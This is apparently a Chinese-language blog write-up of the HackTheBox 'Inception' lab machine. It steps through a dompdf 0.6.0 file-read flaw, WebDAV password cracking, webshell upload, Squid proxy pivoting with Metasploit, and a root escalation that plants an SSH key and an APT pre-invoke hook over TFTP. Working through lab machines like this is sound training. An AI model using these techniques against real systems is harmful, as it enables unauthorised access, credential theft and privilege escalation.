@@ -1,0 +1,730 @@
+<!DOCTYPE html>
+<html>
+<head>
+    
+
+    
+
+    
+
+
+
+    <meta charset="utf-8">
+    
+    
+    
+    
+    <title>Inception - HackTheBox | 喵喵喵喵 | 某鱼唇的人类</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#66CCFF">
+    
+    
+    <meta name="keywords" content="HackTheBox">
+    <meta name="description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;117  10.10.10.67                                                                                                              端口扫描80和3128: 12345678">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Inception - HackTheBox">
+<meta property="og:url" content="https://darkwing.moe/2020/03/13/Inception-HackTheBox/index.html">
+<meta property="og:site_name" content="喵喵喵喵">
+<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;117  10.10.10.67                                                                                                              端口扫描80和3128: 12345678">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021052801.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021052802.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021052803.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021052804.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021052805.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021052806.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021052807.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021052808.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021052810.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021052809.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021052811.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021052812.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021052813.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021052814.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021052815.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021052816.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021052817.jpg">
+<meta property="article:published_time" content="2020-03-13T07:11:20.000Z">
+<meta property="article:modified_time" content="2021-05-28T07:13:26.531Z">
+<meta property="article:author" content="暗羽">
+<meta property="article:tag" content="HackTheBox">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021052801.jpg">
+    
+        <link rel="alternate" type="application/atom+xml" title="喵喵喵喵" href="/atom.xml">
+    
+    <link rel="shortcut icon" href="/favicon.ico">
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body>
+    <div id="loading" class="active"></div>
+
+    <aside id="menu" class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">暗羽</h5>
+          <a href="mailto:1126955201@qq.com" title="1126955201@qq.com" class="mail">1126955201@qq.com</a>
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="waves-block waves-effect">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                主页
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                Archives
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/tags"  >
+                <i class="icon icon-lg icon-tags"></i>
+                Tags
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/categories"  >
+                <i class="icon icon-lg icon-th-list"></i>
+                Categories
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://github.com/zjicmDarkWing" target="_blank" >
+                <i class="icon icon-lg icon-github"></i>
+                Github
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://twitter.com/darkwing_nya" target="_blank" >
+                <i class="icon icon-lg icon-gratipay"></i>
+                彼女募集中
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://darkwing.moe/2015/01/01/about/"  >
+                <i class="icon icon-lg icon-link"></i>
+                一些链接
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">Inception - HackTheBox</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="Search">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
+            <i class="icon icon-lg icon-share-alt"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+
+    <div class="container fade-scale">
+        <h1 class="title">Inception - HackTheBox</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2020-03-13T07:11:20.000Z" itemprop="datePublished" class="page-time">
+  2020-03-13
+</time>
+
+
+            
+        </h5>
+    </div>
+
+    
+
+
+</header>
+
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#基本信息"><span class="post-toc-number">1.</span> <span class="post-toc-text">基本信息</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#10-10-10-67"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">10.10.10.67</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#端口扫描"><span class="post-toc-number">2.</span> <span class="post-toc-text">端口扫描</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#80"><span class="post-toc-number">2.1.</span> <span class="post-toc-text">80</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#dompdf"><span class="post-toc-number">3.</span> <span class="post-toc-text">dompdf</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#vulns"><span class="post-toc-number">3.1.</span> <span class="post-toc-text">vulns</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#文件读取"><span class="post-toc-number">3.2.</span> <span class="post-toc-text">文件读取</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#webdav"><span class="post-toc-number">3.3.</span> <span class="post-toc-text">webdav</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#webshell"><span class="post-toc-number">4.</span> <span class="post-toc-text">webshell</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#wp-config-php"><span class="post-toc-number">4.1.</span> <span class="post-toc-text">wp-config.php</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#代理扫描"><span class="post-toc-number">5.</span> <span class="post-toc-text">代理扫描</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#ssh-amp-user-flag"><span class="post-toc-number">6.</span> <span class="post-toc-text">ssh &amp; user flag</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#提权信息"><span class="post-toc-number">7.</span> <span class="post-toc-text">提权信息</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#扫描"><span class="post-toc-number">7.1.</span> <span class="post-toc-text">扫描</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#FTP"><span class="post-toc-number">7.2.</span> <span class="post-toc-text">FTP</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#crontab"><span class="post-toc-number">7.3.</span> <span class="post-toc-text">crontab</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#利用方式"><span class="post-toc-number">7.4.</span> <span class="post-toc-text">利用方式</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#root-flag"><span class="post-toc-number">8.</span> <span class="post-toc-text">root flag</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#参考资料"><span class="post-toc-number">9.</span> <span class="post-toc-text">参考资料</span></a></li></ol>
+        </nav>
+    </aside>
+
+
+<article id="post-Inception-HackTheBox"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">Inception - HackTheBox</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2020-03-13 15:11:20" datetime="2020-03-13T07:11:20.000Z"  itemprop="datePublished">2020-03-13</time>
+
+            
+
+
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
+</span>
+
+
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <h1 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h1><ul>
+<li><p><a href="https://www.hackthebox.eu/home/machines/profile/117" target="_blank" rel="noopener">https://www.hackthebox.eu/home/machines/profile/117</a></p>
+</li>
+<li><h2 id="10-10-10-67"><a href="#10-10-10-67" class="headerlink" title="10.10.10.67"></a>10.10.10.67</h2></li>
+</ul>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021052801.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><p>80和3128:</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> nmap -sC -sV 10.10.10.67</span></span><br><span class="line"></span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-28 14:04 CST</span><br><span class="line">Nmap scan report for 10.10.10.67</span><br><span class="line">Host is up (0.069s latency).</span><br><span class="line">Not shown: 998 filtered ports</span><br><span class="line">PORT     STATE SERVICE    VERSION</span><br><span class="line">80/tcp   open  http       Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.18 (Ubuntu)</span><br><span class="line">|_http-title: Inception</span><br><span class="line">3128/tcp open  http-proxy Squid http proxy 3.5.12</span><br><span class="line">|_http-server-header: squid/3.5.12</span><br><span class="line">|_http-title: ERROR: The requested URL could not be retrieved</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 94.14 seconds</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="80"><a href="#80" class="headerlink" title="80"></a>80</h2><p>源码最底部给出提示，dompdf：</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021052802.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021052803.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<h1 id="dompdf"><a href="#dompdf" class="headerlink" title="dompdf"></a>dompdf</h1><p>直接访问dompdf可以列出文件，version可以知道是0.6.0:</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021052804.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021052805.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<h2 id="vulns"><a href="#vulns" class="headerlink" title="vulns"></a>vulns</h2><p>搜到两个漏洞：</p>
+<ul>
+<li>dompdf 0.6.0 - ‘dompdf.php?read’ Arbitrary File Read - PHP webapps Exploit<br><a href="https://www.exploit-db.com/exploits/33004" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/33004</a></li>
+<li>dompdf 0.6.0 beta1 - Remote File Inclusion - PHP webapps Exploit<br><a href="https://www.exploit-db.com/exploits/14851" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/14851</a></li>
+</ul>
+<h2 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h2><p>文件读取是渲染成pdf，base64解码得到内容：</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021052806.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021052807.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021052808.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<h2 id="webdav"><a href="#webdav" class="headerlink" title="webdav"></a>webdav</h2><p>后面就是读文件获取信息，发现webdav：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">/etc/apache2/sites-enabled/000-default.conf</span><br><span class="line">Alias /webdav_test_inception /var/www/html/webdav_test_inception</span><br><span class="line">  	&lt;Location /webdav_test_inception&gt;</span><br><span class="line">  		Options FollowSymLinks</span><br><span class="line">  		DAV On</span><br><span class="line">  		AuthType Basic</span><br><span class="line">  		AuthName "webdav test credential"</span><br><span class="line">  		AuthUserFile /var/www/html/webdav_test_inception/webdav.passwd</span><br><span class="line">  		Require valid-user</span><br><span class="line">  	&lt;/Location&gt;</span><br><span class="line">  </span><br><span class="line"><span class="meta">#</span><span class="bash"> 读取wbdav密码</span></span><br><span class="line">/var/www/html/webdav_test_inception/webdav.passwd</span><br><span class="line">webdav_tester:$apr1$8rO7Smi4$yqn7H.GvJFtsTou1a7VME0</span><br><span class="line"><span class="meta">#</span><span class="bash"> 破解出明文</span></span><br><span class="line">babygurl69</span><br></pre></td></tr></table></figure>
+
+<h1 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h1><p>通过Webdav写webshell：</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021052810.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>因为有401基础认证，用蚁剑的话记得配置下header：</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021052809.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<h2 id="wp-config-php"><a href="#wp-config-php" class="headerlink" title="wp-config.php"></a>wp-config.php</h2><p>有个woirdpress，config里得到数据库配置信息：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">define(&#39;DB_USER&#39;, &#39;root&#39;);</span><br><span class="line">define(&#39;DB_PASSWORD&#39;, &#39;VwPddNh7xMZyDQoByQL4&#39;);</span><br></pre></td></tr></table></figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021052811.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<h1 id="代理扫描"><a href="#代理扫描" class="headerlink" title="代理扫描"></a>代理扫描</h1><p>因为前面看到有3128 squid代理，尝试通过代理扫描本机,发现通过代理可以访问22:</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue_win8) &gt; use auxiliary/scanner/http/squid_pivot_scanning</span><br><span class="line">msf6 auxiliary(scanner/http/squid_pivot_scanning) &gt; set RPORT 3128</span><br><span class="line">RPORT =&gt; 3128</span><br><span class="line">msf6 auxiliary(scanner/http/squid_pivot_scanning) &gt; set RHOSTS 10.10.10.67</span><br><span class="line">RHOSTS =&gt; 10.10.10.67</span><br><span class="line">msf6 auxiliary(scanner/http/squid_pivot_scanning) &gt; set RANGE 127.0.0.1</span><br><span class="line">RANGE =&gt; 127.0.0.1</span><br><span class="line">msf6 auxiliary(scanner/http/squid_pivot_scanning) &gt; set PORTS 21,80,139,443,445,1433,1521,1723,3389,8080,9100,22</span><br><span class="line">PORTS =&gt; 21,80,139,443,445,1433,1521,1723,3389,8080,9100,22</span><br><span class="line">msf6 auxiliary(scanner/http/squid_pivot_scanning) &gt; run</span><br></pre></td></tr></table></figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021052812.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<h1 id="ssh-amp-user-flag"><a href="#ssh-amp-user-flag" class="headerlink" title="ssh &amp; user flag"></a>ssh &amp; user flag</h1><p>那就可以尝试通过代理连接，密码就是数据库的root密码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http 10.10.10.67 3128</span><br><span class="line"></span><br><span class="line">proxychainse ssh cobb@127.0.1.1</span><br></pre></td></tr></table></figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021052813.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<h1 id="提权信息"><a href="#提权信息" class="headerlink" title="提权信息"></a>提权信息</h1><p>当前用户无限制sudo，但root.txt提示在其他地方：</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021052814.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<h2 id="扫描"><a href="#扫描" class="headerlink" title="扫描"></a>扫描</h2><p>根据ip地址和dns配置等信息，进一步扫描：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -zv 192.168.0.1 1-65535 &amp;&gt; results &amp;&amp; cat results | grep succeeded</span><br></pre></td></tr></table></figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021052815.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<h2 id="FTP"><a href="#FTP" class="headerlink" title="FTP"></a>FTP</h2><p>ftp匿名访问，看起来是整个系统：</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021052816.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<h2 id="crontab"><a href="#crontab" class="headerlink" title="crontab"></a>crontab</h2><p>根据/etc/crontab，每5分钟一次apt更新，而更新时会运行/etc/apt/apt.conf.d/里的命令：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># &#x2F;etc&#x2F;crontab: system-wide crontab</span><br><span class="line"># Unlike any other crontab you don&#39;t have to run the &#96;crontab&#39;</span><br><span class="line"># command to install the new version when you edit this file</span><br><span class="line"># and files in &#x2F;etc&#x2F;cron.d. These files also have username fields,</span><br><span class="line"># that none of the other crontabs do.</span><br><span class="line"></span><br><span class="line">SHELL&#x3D;&#x2F;bin&#x2F;sh</span><br><span class="line">PATH&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;sbin:&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin</span><br><span class="line"></span><br><span class="line"># m h dom mon dow user	command</span><br><span class="line">17 *	* * *	root    cd &#x2F; &amp;&amp; run-parts --report &#x2F;etc&#x2F;cron.hourly</span><br><span class="line">25 6	* * *	root	test -x &#x2F;usr&#x2F;sbin&#x2F;anacron || ( cd &#x2F; &amp;&amp; run-parts --report &#x2F;etc&#x2F;cron.daily )</span><br><span class="line">47 6	* * 7	root	test -x &#x2F;usr&#x2F;sbin&#x2F;anacron || ( cd &#x2F; &amp;&amp; run-parts --report &#x2F;etc&#x2F;cron.weekly )</span><br><span class="line">52 6	1 * *	root	test -x &#x2F;usr&#x2F;sbin&#x2F;anacron || ( cd &#x2F; &amp;&amp; run-parts --report &#x2F;etc&#x2F;cron.monthly )</span><br><span class="line">*&#x2F;5 *	* * *	root	apt update 2&gt;&amp;1 &gt;&#x2F;var&#x2F;log&#x2F;apt&#x2F;custom.log</span><br><span class="line">30 23	* * *	root	apt upgrade -y 2&gt;&amp;1 &gt;&#x2F;dev&#x2F;null</span><br></pre></td></tr></table></figure>
+
+<h2 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h2><p>就是生成ssh密钥，写进去，命令也写进去，等待触发(ftp没有写权限，tftp可以，这个也可以通过查看配置文件知道)：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen</span><br><span class="line"></span><br><span class="line">tftp 192.168.0.1</span><br><span class="line"><span class="meta">tftp&gt;</span><span class="bash"> put /root/.ssh/id_rsa.pub /root/.ssh/authorized_keys</span></span><br><span class="line"></span><br><span class="line">echo 'APT::Update::Pre-Invoke &#123;"chmod 600 /root/.ssh/authorized_keys"&#125;;' &gt; 00command</span><br><span class="line"></span><br><span class="line">tftp 192.168.0.1</span><br><span class="line"><span class="meta">tftp&gt;</span><span class="bash"> put 00command /etc/apt/apt.conf.d/00command</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="root-flag"><a href="#root-flag" class="headerlink" title="root flag"></a>root flag</h1><p>5分钟自动执行后，ssh连进去，得到root.txt:</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021052817.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul>
+<li>dompdf 0.6.0 - ‘dompdf.php?read’ Arbitrary File Read - PHP webapps Exploit<br><a href="https://www.exploit-db.com/exploits/33004" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/33004</a></li>
+<li>dompdf 0.6.0 beta1 - Remote File Inclusion - PHP webapps Exploit<br><a href="https://www.exploit-db.com/exploits/14851" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/14851</a></li>
+<li>Inception write-up - The Portal of Knowledge<br><a href="https://alamot.github.io/inception_writeup/" target="_blank" rel="noopener">https://alamot.github.io/inception_writeup/</a></li>
+<li><a href="https://www.hackthebox.eu/home/machines/writeup/117" target="_blank" rel="noopener">https://www.hackthebox.eu/home/machines/writeup/117</a></li>
+<li>HackTheBox - Inception - YouTube<br><a href="https://www.youtube.com/watch?v=J2I-5xPgyXk&amp;ab_channel=IppSec" target="_blank" rel="noopener">https://www.youtube.com/watch?v=J2I-5xPgyXk&amp;ab_channel=IppSec</a></li>
+</ul>
+
+        </div>
+
+        <blockquote class="post-copyright">
+    
+    <div class="content">
+        
+<span class="post-time">
+    Last updated: <time datetime="2021-05-28T07:13:26.531Z" itemprop="dateUpdated">2021-05-28 15:13:26</time>
+</span><br>
+
+
+        
+        水平不济整日被虐这也不会那也得学,脑子太蠢天天垫底这看不懂那学不会
+        
+    </div>
+    
+    <footer>
+        <a href="https://darkwing.moe">
+            <img src="/img/avatar.jpg" alt="暗羽">
+            暗羽
+        </a>
+    </footer>
+</blockquote>
+
+        
+<div class="page-reward">
+    <a id="rewardBtn" href="javascript:;" class="page-reward-btn waves-effect waves-circle waves-light">赏</a>
+</div>
+
+
+
+        <div class="post-footer">
+            
+	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/HackTheBox/" rel="tag">HackTheBox</a></li></ul>
+
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://darkwing.moe/2020/03/13/Inception-HackTheBox/&title=《Inception - HackTheBox》 — 喵喵喵喵&pic=https://darkwing.moe/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://darkwing.moe/2020/03/13/Inception-HackTheBox/&title=《Inception - HackTheBox》 — 喵喵喵喵&source=安全研究，彼女募集中" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://darkwing.moe/2020/03/13/Inception-HackTheBox/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Inception - HackTheBox》 — 喵喵喵喵&url=https://darkwing.moe/2020/03/13/Inception-HackTheBox/&via=https://darkwing.moe" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://darkwing.moe/2020/03/13/Inception-HackTheBox/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
